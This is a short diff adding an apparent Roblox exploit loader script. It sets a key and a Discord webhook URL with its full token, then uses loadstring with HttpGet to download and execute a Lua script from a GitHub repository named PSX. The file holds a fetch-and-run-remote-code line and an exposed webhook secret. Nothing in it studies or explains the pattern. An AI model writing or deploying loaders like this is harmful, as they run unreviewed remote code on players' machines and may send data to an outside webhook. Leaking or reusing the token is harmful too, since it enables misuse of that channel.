@@ -1,0 +1,4 @@
+_G.Key = "jAmKKDOeZOXGuMMo"
+_G.Webhook = "https://discord.com/api/webhooks/1057685245878611979/bWb6e6MkTzZwJ4OMckZg_077j8XYM4e7ekVDaa7NNyYifxJk5Ttg84okLvWFMMyFdyoI"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua"))();
